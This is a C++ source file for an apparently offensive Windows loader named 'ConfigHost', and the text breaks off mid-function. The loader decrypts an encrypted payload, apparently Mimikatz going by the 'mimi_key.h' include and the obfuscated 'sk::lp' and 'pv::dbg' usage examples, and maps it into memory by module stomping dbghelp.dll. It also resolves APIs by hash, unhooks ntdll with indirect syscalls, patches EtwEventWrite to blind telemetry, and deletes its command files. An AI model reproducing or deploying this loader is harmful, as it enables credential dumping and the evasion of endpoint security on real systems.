
#include <Windows.h>
#include <winternl.h>
#include "resolve.h"

#pragma function(memset, memcpy)
extern "C" void* memset(void* dst, int val, size_t cnt) {
    unsigned char* d = (unsigned char*)dst;
    while (cnt--) *d++ = (unsigned char)val;
    return dst;
}
extern "C" void* memcpy(void* dst, const void* src, size_t cnt) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (cnt--) *d++ = *s++;
    return dst;
}

#pragma comment(lib, "user32.lib")
static volatile FARPROC _u32[] = { (FARPROC)&GetDC, (FARPROC)&ReleaseDC, (FARPROC)&GetSystemMetrics };

extern "C" NTSTATUS DoIndirectVP(LPVOID addr, SIZE_T size, DWORD prot, PDWORD old, DWORD ssn, PVOID gadget);
extern "C" NTSTATUS DoIndirectAVM(HANDLE proc, PVOID* base, ULONG_PTR zeroBits, PSIZE_T size, ULONG allocType, ULONG protect, DWORD ssn, PVOID gadget);

typedef HMODULE(WINAPI* fn_LLA)(LPCSTR);
typedef LPVOID(WINAPI* fn_VA)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fn_CF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL(WINAPI* fn_RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef DWORD(WINAPI* fn_GFS)(HANDLE,LPDWORD);
typedef BOOL(WINAPI* fn_CH)(HANDLE);
typedef BOOL(WINAPI* fn_CAC)(HCRYPTPROV*,LPCSTR,LPCSTR,DWORD,DWORD);
typedef BOOL(WINAPI* fn_CHH)(HCRYPTPROV,ALG_ID,HCRYPTKEY,DWORD,HCRYPTHASH*);
typedef BOOL(WINAPI* fn_CHD)(HCRYPTHASH,const BYTE*,DWORD,DWORD);
typedef BOOL(WINAPI* fn_CDK)(HCRYPTPROV,ALG_ID,HCRYPTHASH,DWORD,HCRYPTKEY*);
typedef BOOL(WINAPI* fn_CDT)(HCRYPTKEY,HCRYPTHASH,BOOL,DWORD,BYTE*,DWORD*);
typedef BOOL(WINAPI* fn_DK)(HCRYPTKEY);
typedef BOOL(WINAPI* fn_DH)(HCRYPTHASH);
typedef BOOL(WINAPI* fn_RC)(HCRYPTPROV,DWORD);
typedef HANDLE(WINAPI* fn_CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD(WINAPI* fn_WF)(HANDLE,DWORD);
typedef FARPROC(WINAPI* fn_GPA)(HMODULE,LPCSTR);

static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
    for (DWORD i=0;i<l;i++) o[i]=d[i]^k; o[l]=0;
}


static volatile const char _build_ts[] = __DATE__ " " __TIME__;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)nCmdShow; (void)_build_ts;

    HMODULE hK = GetModH(0xFB4F5B77u);
    if (!hK) return 10;

    fn_LLA pLLA = (fn_LLA)GetExpH(hK, 0x97FD671Fu);
    fn_VA  pVA  = (fn_VA)GetExpH(hK, 0xFB9400ABu);
    fn_VP  pVP  = (fn_VP)GetExpH(hK, 0x81BD9BADu);
    fn_CT  pCT  = (fn_CT)GetExpH(hK, 0xF51FF82Du);
    fn_WF  pWF  = (fn_WF)GetExpH(hK, 0x793529D8u);
    fn_CF  pCF  = (fn_CF)GetExpH(hK, 0xC0DBB964u);
    fn_RF  pRF  = (fn_RF)GetExpH(hK, 0xB9835133u);
    fn_GFS pGFS = (fn_GFS)GetExpH(hK, 0x0EAE9872u);
    fn_CH  pCH  = (fn_CH)GetExpH(hK, 0x82E971DBu);

    HMODULE hKB = GetModH(0x2390E863u);
    fn_GPA pGPA = hKB ? (fn_GPA)GetExpH(hKB, 0xB0F41F09u) : NULL;
    if (!pLLA || !pVA || !pVP || !pCT || !pWF || !pGPA || !pCF || !pRF || !pGFS || !pCH) return 11;

    HMODULE hNT = GetModH(0xBFF6D513u);
    DWORD ssnVP = 0, ssnAVM = 0;
    PVOID gadget = NULL;
    if (hNT) {
        PIMAGE_NT_HEADERS ntNh = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNT + ((PIMAGE_DOS_HEADER)hNT)->e_lfanew);
        DWORD ntSz = ntNh->OptionalHeader.SizeOfImage;
        BYTE* scan = (BYTE*)hNT;
        for (DWORD i = 0; i < ntSz - 3; i++) {
            if (scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3) {
                gadget = &scan[i];
                break;
            }
        }
        char ntpath[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
        HANDLE hNtF = pCF(ntpath, 0x80000000, 1, NULL, 3, 0x80, NULL);
        if (hNtF != INVALID_HANDLE_VALUE) {
            DWORD ntFSz = pGFS(hNtF, NULL);
            BYTE* ntRaw = (BYTE*)pVA(NULL, ntFSz, 0x3000, 0x04);
            if (ntRaw) {
                DWORD ntRd;
                pRF(hNtF, ntRaw, ntFSz, &ntRd, NULL);
                pCH(hNtF);
                PIMAGE_DOS_HEADER ntDos = (PIMAGE_DOS_HEADER)ntRaw;
                PIMAGE_NT_HEADERS ntNhC = (PIMAGE_NT_HEADERS)(ntRaw + ntDos->e_lfanew);
                DWORD ntImgSz = ntNhC->OptionalHeader.SizeOfImage;
                BYTE* ntClean = (BYTE*)pVA(NULL, ntImgSz, 0x3000, 0x04);
                if (ntClean) {
                    for (DWORD ci = 0; ci < ntNhC->OptionalHeader.SizeOfHeaders; ci++)
                        ntClean[ci] = ntRaw[ci];
                    PIMAGE_SECTION_HEADER ntSec = IMAGE_FIRST_SECTION(ntNhC);
                    for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
                        if (ntSec[si].SizeOfRawData > 0)
                            for (DWORD j = 0; j < ntSec[si].SizeOfRawData; j++)
                                ntClean[ntSec[si].VirtualAddress + j] = ntRaw[ntSec[si].PointerToRawData + j];
                    }
                    FARPROC pNtPVM = GetExpH((HMODULE)ntClean, 0x889C44B6u);
                    if (pNtPVM) ssnVP = *(DWORD*)((BYTE*)pNtPVM + 4);
                    FARPROC pNtAVM = GetExpH((HMODULE)ntClean, 0xC56666C0u);
                    if (pNtAVM) ssnAVM = *(DWORD*)((BYTE*)pNtAVM + 4);

                    if (ssnVP && gadget) {
                        PIMAGE_SECTION_HEADER ntSec2 = IMAGE_FIRST_SECTION(ntNhC);
                        for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
                            if (ntSec2[si].Characteristics & 0x20) {
                                BYTE* hookedText = (BYTE*)hNT + ntSec2[si].VirtualAddress;
                                BYTE* cleanText = ntClean + ntSec2[si].VirtualAddress;
                                SIZE_T textSz = ntSec2[si].Misc.VirtualSize;
                                DWORD oldP;
                                DoIndirectVP(hookedText, textSz, 0x40, &oldP, ssnVP, gadget);
                                for (DWORD j = 0; j < (DWORD)textSz; j++)
                                    hookedText[j] = cleanText[j];
                                DoIndirectVP(hookedText, textSz, oldP, &oldP, ssnVP, gadget);
                                break;
                            }
                        }
                    }
                    (void)ssnAVM;
                }
            } else {
                pCH(hNtF);
            }
        }
    }

    char cj[16];
    const unsigned char enc_cj[] = {0x4A,0x45,0x5B,0x43,0x40,0x5D,0x07,0x4D,0x45,0x45};
    xd(cj, enc_cj, sizeof(enc_cj), 0x29);
    HMODULE hCJ = pLLA(cj);
    BYTE* cjText = NULL;
    if (hCJ) {
        PIMAGE_DOS_HEADER cjD = (PIMAGE_DOS_HEADER)hCJ;
        PIMAGE_NT_HEADERS cjN = (PIMAGE_NT_HEADERS)((ULONG_PTR)hCJ + cjD->e_lfanew);
        PIMAGE_SECTION_HEADER cjS = IMAGE_FIRST_SECTION(cjN);
        for (WORD i = 0; i < cjN->FileHeader.NumberOfSections; i++) {
            if (cjS[i].Characteristics & 0x20) {
                cjText = (BYTE*)hCJ + cjS[i].VirtualAddress;
                break;
            }
        }
        if (cjText) {
            DWORD old;
            pVP(cjText, 4096, 0x40, &old);
        }
    }

    {
        char s_gcla[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
        typedef LPSTR(WINAPI* fn_GCLA)();
        fn_GCLA pGCLA = (fn_GCLA)pGPA(hK, s_gcla);
        if (!pGCLA) return 12;
        lpCmdLine = pGCLA();
        if (*lpCmdLine == '"') { lpCmdLine++; while (*lpCmdLine && *lpCmdLine != '"') lpCmdLine++; if (*lpCmdLine) lpCmdLine++; }
        else { while (*lpCmdLine && *lpCmdLine != ' ') lpCmdLine++; }
        while (*lpCmdLine == ' ') lpCmdLine++;
    }
    if (!lpCmdLine[0]) return 12;

    if ((lpCmdLine[0] == '-' && lpCmdLine[1] == 'h') ||
        (lpCmdLine[0] == '/' && lpCmdLine[1] == '?')) {
        char s_atc[] = {'A','t','t','a','c','h','C','o','n','s','o','l','e',0};
        typedef BOOL(WINAPI* fn_ATC)(DWORD);
        fn_ATC pATC = (fn_ATC)pGPA(hK, s_atc);
        if (pATC) pATC((DWORD)-1);
        typedef HANDLE(WINAPI* fn_GSH)(DWORD);
        char s_gsh[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
        fn_GSH pGSH = (fn_GSH)pGPA(hK, s_gsh);
        if (pGSH) {
            char conout[] = {'C','O','N','O','U','T','$',0};
            HANDLE hO = pCF(conout, 0x40000000, 3, NULL, 3, 0, NULL);
            const char msg[] =
                "\r\n  ConfigHost - In-memory PE loader\r\n\r\n"
                "  Usage:\r\n"
                "    ConfigHost.exe <payload> [/log:file] [cmd1] [cmd2] ... [exit]\r\n"
                "    ConfigHost.exe <payload> @commands.txt [/log:file]\r\n\r\n"
                "  Arguments:\r\n"
                "    <payload>    Path to encrypted payload (.bin)\r\n"
                "    /log:file    Write all output to file (for WinRM/non-interactive)\r\n"
                "    @file        Read commands from file (deleted after reading)\r\n"
                "    [cmd]        Commands passed to payload (optional)\r\n"
                "    exit         Close after execution\r\n\r\n"
                "  Examples:\r\n"
                "    ConfigHost.exe cipher.bin\r\n"
                "    ConfigHost.exe cipher.bin \"vt::cr\" exit\r\n"
                "    ConfigHost.exe cipher.bin /log:out.txt \"pv::dbg\" \"sk::lp\" exit\r\n"
                "    ConfigHost.exe cipher.bin @cmds.txt /log:C:\\temp\\out.txt\r\n\r\n"
                "  Without commands: opens interactive console.\r\n"
                "  With /log: output is written to file.\r\n\r\n";
            DWORD wr;
            char s_wf[] = {'W','r','i','t','e','F','i','l','e',0};
            typedef BOOL(WINAPI* fn_WrF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
            fn_WrF pWrF = (fn_WrF)pGPA(hK, s_wf);
            if (pWrF && hO != INVALID_HANDLE_VALUE) pWrF(hO, msg, sizeof(msg) - 1, &wr, NULL);
            char s_ssh[] = {'S','e','t','S','t','d','H','a','n','d','l','e',0};
            typedef BOOL(WINAPI* fn_SSH)(DWORD,HANDLE);
            fn_SSH pSSH = (fn_SSH)pGPA(hK, s_ssh);
            if (pSSH && hO != INVALID_HANDLE_VALUE) {
                pSSH((DWORD)-11, hO);
                pSSH((DWORD)-12, hO);
            }
        }
        return 0;
    }

    char* payloadPath = lpCmdLine;
    while (*payloadPath == ' ' || *payloadPath == '"') payloadPath++;
    char cleanPath[260];
    int pi = 0;
    while (payloadPath[pi] && payloadPath[pi] != '"' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
    cleanPath[pi] = 0;
    char* extraArgs = payloadPath + pi;
    if (*extraArgs == '"') extraArgs++;
    while (*extraArgs == ' ') extraArgs++;

    char logPath[260];
    logPath[0] = 0;
    {
        char* scan = extraArgs;
        while (*scan) {
            while (*scan == ' ') scan++;
            if (!*scan) break;
            if (scan[0] == '/' && scan[1] == 'l' && scan[2] == 'o' && scan[3] == 'g' && scan[4] == ':') {
                char* lp = scan + 5;
                int li = 0;
                char* argEnd;
                if (*lp == '"') {
                    lp++;
                    while (lp[li] && lp[li] != '"' && li < 258) { logPath[li] = lp[li]; li++; }
                    logPath[li] = 0;
                    argEnd = lp + li;
                    if (*argEnd == '"') argEnd++;
                } else {
                    while (lp[li] && lp[li] != ' ' && li < 258) { logPath[li] = lp[li]; li++; }
                    logPath[li] = 0;
                    argEnd = lp + li;
                }
                while (*argEnd == ' ') argEnd++;
                char* dst = scan;
                while (*argEnd) *dst++ = *argEnd++;
                *dst = 0;
                break;
            }
            if (*scan == '"') { scan++; while (*scan && *scan != '"') scan++; if (*scan) scan++; }
            else { while (*scan && *scan != ' ') scan++; }
        }
    }

    char dll2[16];
    const unsigned char enc_a[] = {0x23,0x26,0x34,0x23,0x32,0x2B,0x71,0x70,0x6C,0x26,0x2E,0x2E};
    xd(dll2, enc_a, sizeof(enc_a), 0x42);
    HMODULE hA = pLLA(dll2);
    if (!hA) return 0;

    fn_CAC pCAC = (fn_CAC)GetExpH(hA, 0x9C389AADu);
    fn_CHH pCCH = (fn_CHH)GetExpH(hA, 0x971D20FDu);
    fn_CHD pCHD = (fn_CHD)GetExpH(hA, 0x584DDBE9u);
    fn_CDK pCDK = (fn_CDK)GetExpH(hA, 0xED084395u);
    fn_CDT pCDT = (fn_CDT)GetExpH(hA, 0xC9954C26u);
    fn_DK pDK = (fn_DK)GetExpH(hA, 0x2976A3FEu);
    fn_DH pDH = (fn_DH)GetExpH(hA, 0xE4A6591Bu);
    fn_RC pRC = (fn_RC)GetExpH(hA, 0x3B6CDDFDu);
    if (!pCAC || !pCCH || !pCHD || !pCDK || !pCDT || !pDK || !pDH || !pRC) return 13;

    HANDLE hFile = pCF(cleanPath, 0x80000000, 1, NULL, 3, 0x80, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 14;
    DWORD total = pGFS(hFile, NULL);
    if (total == 0xFFFFFFFF || total < 0x100) { pCH(hFile); return 15; }

    LPVOID buf = pVA(NULL, total, 0x3000, 0x04);
    if (!buf) { pCH(hFile); return 16; }

    DWORD rd = 0, totalRead = 0;
    while (totalRead < total) {
        if (!pRF(hFile, (BYTE*)buf + totalRead, total - totalRead, &rd, NULL) || rd == 0) break;
        totalRead += rd;
    }
    pCH(hFile);
    if (totalRead < 0x100) return 17;
    total = totalRead;

    DWORD evSz = *(DWORD*)buf;
    {
        DWORD skip = 4;
        if (evSz > 0 && evSz < 0x100000 && 4 + evSz < total) skip = 4 + evSz;
        for (DWORD mv = 0; mv < total - skip; mv++) ((BYTE*)buf)[mv] = ((BYTE*)buf)[skip + mv];
        total -= skip;
    }

    HCRYPTPROV hProv = 0;
    if (!pCAC(&hProv, NULL, NULL, 24, 0xF0000000)) return 20;
    HCRYPTHASH hHash = 0;
    if (!pCCH(hProv, 0x8004, 0, 0, &hHash)) return 21;

    #include "mimi_key.h"
    if (!pCHD(hHash, keyBuff, sizeof(keyBuff), 0)) return 22;

    HCRYPTKEY hKey = 0;
    if (!pCDK(hProv, 0x6610, hHash, 0, &hKey)) return 23;

    DWORD decLen = total;
    if (!pCDT(hKey, 0, TRUE, 0, (BYTE*)buf, &decLen)) return 24;
    pDK(hKey); pDH(hHash); pRC(hProv, 0);
    if (decLen < 0x100) return 18;

    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)buf;
    if (dh->e_magic != 0x5A4D) return 25;
    PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((ULONG_PTR)buf + dh->e_lfanew);
    DWORD imgSz = nh->OptionalHeader.SizeOfImage;

    LPVOID img;
    {
        char s_cfa[] = {'C','o','p','y','F','i','l','e','A',0};
        char s_gtp[] = {'G','e','t','T','e','m','p','P','a','t','h','A',0};
        typedef BOOL(WINAPI* fn_CFA)(LPCSTR, LPCSTR, BOOL);
        typedef DWORD(WINAPI* fn_GTP)(DWORD, LPSTR);
        fn_CFA pCFA = (fn_CFA)pGPA(hK, s_cfa);
        fn_GTP pGTP = (fn_GTP)pGPA(hK, s_gtp);
        if (!pCFA || !pGTP) return 30;
        char src[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0};
        char tb[80]; DWORD tl = pGTP(sizeof(tb), tb);
        if (tl == 0) return 30;
        char dst[100]; int di = 0;
        for (DWORD ti = 0; ti < tl && di < 90; ti++) dst[di++] = tb[ti];
        if (di > 0 && dst[di-1] != '\\') dst[di++] = '\\';
        char sfx[] = {'d','h','.','d','l','l',0};
        for (int si = 0; sfx[si]; si++) dst[di++] = sfx[si];
        dst[di] = 0;
        pCFA(src, dst, FALSE);
        char s_llex[] = {'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};
        typedef HMODULE(WINAPI* fn_LLEX)(LPCSTR,HANDLE,DWORD);
        fn_LLEX pLLEX = (fn_LLEX)pGPA(hK, s_llex);
        if (!pLLEX) return 31;
        HMODULE hSM = pLLEX(dst, NULL, 1);
        if (!hSM) return 32;
        PIMAGE_NT_HEADERS stNh = (PIMAGE_NT_HEADERS)((BYTE*)hSM + ((PIMAGE_DOS_HEADER)hSM)->e_lfanew);
        DWORD stSz = stNh->OptionalHeader.SizeOfImage;
        if (stSz < imgSz) return 33;
        DWORD oldp;
        pVP((LPVOID)hSM, stSz, 0x40, &oldp);
        for (DWORD z = 0; z < stSz; z++) ((BYTE*)hSM)[z] = 0;
        img = (LPVOID)hSM;

        char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
        typedef BOOL(WINAPI* fn_DFA)(LPCSTR);
        fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
        if (pDFA) pDFA(dst);
    }

    for (DWORD i = 0; i < nh->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)img)[i] = ((BYTE*)buf)[i];

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nh);
    for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            BYTE* ddst = (BYTE*)img + sec[i].VirtualAddress;
            BYTE* ssrc = (BYTE*)buf + sec[i].PointerToRawData;
            for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
                ddst[j] = ssrc[j];
        }
    }

    ULONG_PTR delta = (ULONG_PTR)img - nh->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY relDir = nh->OptionalHeader.DataDirectory[5];
    if (delta && relDir.VirtualAddress) {
        BYTE* reloc = (BYTE*)img + relDir.VirtualAddress;
        while (reloc < (BYTE*)img + relDir.VirtualAddress + relDir.Size) {
            DWORD rva = *(DWORD*)reloc;
            DWORD sz = *(DWORD*)(reloc + 4);
            if (!sz) break;
            WORD* entries = (WORD*)(reloc + 8);
            DWORD count = (sz - 8) / 2;
            for (DWORD i = 0; i < count; i++) {
                if ((entries[i] >> 12) == 10) {
                    ULONG_PTR* p = (ULONG_PTR*)((BYTE*)img + rva + (entries[i] & 0xFFF));
                    *p += delta;
                }
            }
            reloc += sz;
        }
    }

    {
        typedef BOOL(WINAPI* fn_AC)();
        fn_AC pAC = (fn_AC)GetExpH(hK, 0x887D7DBDu);
        if (pAC) pAC();
    }


    IMAGE_DATA_DIRECTORY impDir = nh->OptionalHeader.DataDirectory[1];
    if (impDir.VirtualAddress) {
        BYTE* id = (BYTE*)img + impDir.VirtualAddress;
        while (*(DWORD*)(id + 12)) {
            HMODULE hM = pLLA((char*)((ULONG_PTR)img + *(DWORD*)(id + 12)));
            if (hM) {
                DWORD r0 = *(DWORD*)id, r4 = *(DWORD*)(id + 16);
                ULONG_PTR* lt = (ULONG_PTR*)((BYTE*)img + (r0 ? r0 : r4));
                ULONG_PTR* at = (ULONG_PTR*)((BYTE*)img + r4);
                while (*lt) {
                    LPCSTR fn = (*lt >> 63)
                        ? (LPCSTR)(ULONG_PTR)(*lt & 0xFFFF)
                        : (LPCSTR)((BYTE*)img + (*lt & 0x7FFFFFFF) + 2);
                    *at = (ULONG_PTR)pGPA(hM, fn);
                    lt++; at++;
                }
            }
            id += 20;
        }
    }

    {
        IMAGE_DATA_DIRECTORY excDir = nh->OptionalHeader.DataDirectory[3];
        if (excDir.VirtualAddress && excDir.Size) {
            char raft[20];
            const unsigned char enc_raft[] = {0x08,0x2E,0x36,0x1B,0x3E,0x3E,0x1C,0x2F,0x34,0x39,0x2E,0x33,0x35,0x34,0x0E,0x3B,0x38,0x36,0x3F};
            xd(raft, enc_raft, sizeof(enc_raft), 0x5A);
            typedef BOOLEAN(NTAPI* fn_RAFT)(PRUNTIME_FUNCTION, DWORD, DWORD64);
            fn_RAFT pRAFT = hNT ? (fn_RAFT)pGPA(hNT, raft) : NULL;
            if (pRAFT)
                pRAFT((PRUNTIME_FUNCTION)((BYTE*)img + excDir.VirtualAddress),
                      excDir.Size / sizeof(RUNTIME_FUNCTION),
                      (DWORD64)(ULONG_PTR)img);
        }

    }

    {
        IMAGE_DATA_DIRECTORY tlsDir = nh->OptionalHeader.DataDirectory[9];
        if (tlsDir.VirtualAddress && tlsDir.Size) {
            IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)img + tlsDir.VirtualAddress);
            BYTE* peb2 = (BYTE*)__readgsqword(0x60);
            BYTE* ldr2 = *(BYTE**)(peb2 + 0x18);
            BYTE* hd2 = ldr2 + 0x20;
            BYTE* cr2 = *(BYTE**)hd2;
            DWORD tlsCnt = 0;
            while (cr2 != hd2) {
                HMODULE mx = *(HMODULE*)(cr2 + 0x20);
                if (mx && (LPVOID)mx != img) {
                    IMAGE_NT_HEADERS* mn = (IMAGE_NT_HEADERS*)((BYTE*)mx + ((IMAGE_DOS_HEADER*)mx)->e_lfanew);
                    if (mn->OptionalHeader.DataDirectory[9].VirtualAddress && mn->OptionalHeader.DataDirectory[9].Size)
                        tlsCnt++;
                }
                cr2 = *(BYTE**)cr2;
            }
            PVOID* oldTls = (PVOID*)__readgsqword(0x58);
            PVOID* newTls = (PVOID*)pVA(NULL, (tlsCnt + 1) * sizeof(PVOID), 0x3000, 0x04);
            if (newTls) {
                if (oldTls) for (DWORD ti = 0; ti < tlsCnt; ti++) newTls[ti] = oldTls[ti];
                SIZE_T rawSz = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
                SIZE_T totalSz = rawSz + tls->SizeOfZeroFill;
                LPVOID td = NULL;
                if (totalSz) {
                    td = pVA(NULL, totalSz, 0x3000, 0x04);
                    if (td) for (SIZE_T i = 0; i < rawSz; i++) ((BYTE*)td)[i] = ((BYTE*)(tls->StartAddressOfRawData))[i];
                }
                newTls[tlsCnt] = td;
                *(DWORD*)(tls->AddressOfIndex) = tlsCnt;
                __writegsqword(0x58, (ULONG_PTR)newTls);
                PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
                if (cb) { while (*cb) { (*cb)(img, DLL_PROCESS_ATTACH, NULL); cb++; } }
            }
        }
    }

    if (hNT) {
        char etw[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
        FARPROC pETW = pGPA(hNT, etw);
        if (pETW) {
            DWORD oldETW;
            pVP((LPVOID)pETW, 4, 0x40, &oldETW);
            ((BYTE*)pETW)[0] = 0x33; ((BYTE*)pETW)[1] = 0xC0; ((BYTE*)pETW)[2] = 0xC3;
            pVP((LPVOID)pETW, 4, oldETW, &oldETW);
        }
    }

    {
        PIMAGE_SECTION_HEADER ps = IMAGE_FIRST_SECTION(
            (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew));
        for (WORD si = 0; si < nh->FileHeader.NumberOfSections; si++) {
            DWORD ch = ps[si].Characteristics;
            DWORD prot;
            if (ch & 0x20000000) prot = (ch & 0x80000000) ? 0x40 : 0x20;
            else if (ch & 0x80000000) prot = 0x04;
            else prot = 0x02;
            DWORD osp;
            pVP((BYTE*)img + ps[si].VirtualAddress, ps[si].Misc.VirtualSize, prot, &osp);
        }
    }

    char fileCmds[4096];
    fileCmds[0] = 0;
    if (extraArgs[0] == '@') {
        char* fp = extraArgs + 1;
        while (*fp == ' ' || *fp == '"') fp++;
        char fpC[260]; int fi = 0;
        while (fp[fi] && fp[fi] != '"' && fp[fi] != ' ' && fi < 259) { fpC[fi] = fp[fi]; fi++; }
        fpC[fi] = 0;
        HANDLE hCmdF = pCF(fpC, 0x80000000, 1, NULL, 3, 0, NULL);
        if (hCmdF != INVALID_HANDLE_VALUE) {
            char raw[4000]; raw[0] = 0;
            DWORD fSz = pGFS(hCmdF, NULL);
            if (fSz > 0 && fSz < 3990) { DWORD rd; pRF(hCmdF, raw, fSz, &rd, NULL); raw[rd] = 0; }
            pCH(hCmdF);
            char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
            typedef BOOL(WINAPI* fn_DFA)(LPCSTR); fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
            if (pDFA) pDFA(fpC);
            int out = 0; char* p = raw;
            while (*p && out < 4080) {
                while (*p == '\r' || *p == '\n' || *p == ' ') p++;
                if (!*p) break;
                fileCmds[out++] = '"';
                while (*p && *p != '\r' && *p != '\n' && out < 4080) fileCmds[out++] = *p++;
                fileCmds[out++] = '"';
                fileCmds[out++] = ' ';
            }
            fileCmds[out] = 0;
        }
        extraArgs = fileCmds;
    }

    char logCmds[4200];
    if (logPath[0]) {
        int ci = 0;
        logCmds[ci++] = '"'; logCmds[ci++] = 'l'; logCmds[ci++] = 'o'; logCmds[ci++] = 'g';
        logCmds[ci++] = ' ';
        for (int li = 0; logPath[li] && ci < 4180; li++) logCmds[ci++] = logPath[li];
        logCmds[ci++] = '"'; logCmds[ci++] = ' ';
        for (char* s = extraArgs; *s && ci < 4190; ) logCmds[ci++] = *s++;
        logCmds[ci] = 0;
        extraArgs = logCmds;
    }

    if (*extraArgs) {
        char s_gclw[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','W',0};
        typedef LPWSTR(WINAPI* fn_GCLW)();
        fn_GCLW pGCLW = (fn_GCLW)pGPA(hK, s_gclw);
        char s_mbtwc[] = {'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r',0};
        typedef int(WINAPI* fn_MBTWC)(UINT,DWORD,LPCCH,int,LPWSTR,int);
        fn_MBTWC pMBTWC = (fn_MBTWC)pGPA(hK, s_mbtwc);
        if (pGCLW && pMBTWC) {
            LPWSTR clW = pGCLW();
            char s_gcla2[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
            typedef LPSTR(WINAPI* fn_GCLA2)();
            fn_GCLA2 pGCLA2 = (fn_GCLA2)pGPA(hK, s_gcla2);
            LPSTR clA = pGCLA2 ? pGCLA2() : NULL;
            char fakeA[2048];
            fakeA[0]='p'; fakeA[1]='.'; fakeA[2]='e'; fakeA[3]='x'; fakeA[4]='e'; fakeA[5]=' ';
            int ai = 6;
            for (char* s = extraArgs; *s && ai < 2046; ) fakeA[ai++] = *s++;
            fakeA[ai] = 0;
            int wLen = pMBTWC(0, 0, fakeA, -1, NULL, 0);
            if (wLen > 0 && wLen <= 1024) {
                pMBTWC(0, 0, fakeA, -1, clW, wLen);
            }
            if (clA) {
                for (int ci = 0; ci < ai; ci++) clA[ci] = fakeA[ci];
                clA[ai] = 0;
            }
        }

        char s_wci[] = {'W','r','i','t','e','C','o','n','s','o','l','e','I','n','p','u','t','W',0};
        char s_gsh[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
        typedef BOOL(WINAPI* fn_WCI)(HANDLE, const INPUT_RECORD*, DWORD, LPDWORD);
        typedef HANDLE(WINAPI* fn_GSH)(DWORD);
        fn_WCI pWCI = (fn_WCI)pGPA(hK, s_wci);
        fn_GSH pGSH = (fn_GSH)pGPA(hK, s_gsh);
        if (pWCI && pGSH) {
            HANDLE hIn = pGSH((DWORD)-10);
            char* ea = extraArgs;
            while (*ea) {
                while (*ea == ' ') ea++;
                if (!*ea) break;
                char* s; DWORD n;
                if (*ea == '"') { ea++; s = ea; while (*ea && *ea != '"') ea++; n = (DWORD)(ea - s); if (*ea) ea++; }
                else { s = ea; while (*ea && *ea != ' ') ea++; n = (DWORD)(ea - s); }
                for (DWORD ci = 0; ci < n; ci++) {
                    INPUT_RECORD ir;
                    ir.EventType = KEY_EVENT;
                    ir.Event.KeyEvent.bKeyDown = TRUE;
                    ir.Event.KeyEvent.wRepeatCount = 1;
                    ir.Event.KeyEvent.wVirtualKeyCode = 0;
                    ir.Event.KeyEvent.wVirtualScanCode = 0;
                    ir.Event.KeyEvent.uChar.UnicodeChar = (WCHAR)s[ci];
                    ir.Event.KeyEvent.dwControlKeyState = 0;
                    DWORD wr;
                    pWCI(hIn, &ir, 1, &wr);
                }
                INPUT_RECORD ir;
                ir.EventType = KEY_EVENT;
                ir.Event.KeyEvent.bKeyDown = TRUE;
                ir.Event.KeyEvent.wRepeatCount = 1;
                ir.Event.KeyEvent.wVirtualKeyCode = 0x0D;
                ir.Event.KeyEvent.wVirtualScanCode = 0x1C;
                ir.Event.KeyEvent.uChar.UnicodeChar = L'\r';
                ir.Event.KeyEvent.dwControlKeyState = 0;
                DWORD wr;
                pWCI(hIn, &ir, 1, &wr);
            }
        }
    }

    {
        DWORD hdOld;
        DWORD hdSz = nh->OptionalHeader.SizeOfHeaders;
        ULONG_PTR epRVA = nh->OptionalHeader.AddressOfEntryPoint;

        for (DWORD wi = 0; wi < total; wi++) ((BYTE*)buf)[wi] = 0;

        pVP(img, hdSz, 0x04, &hdOld);
        for (DWORD i = 0; i < hdSz; i++) ((BYTE*)img)[i] = 0;
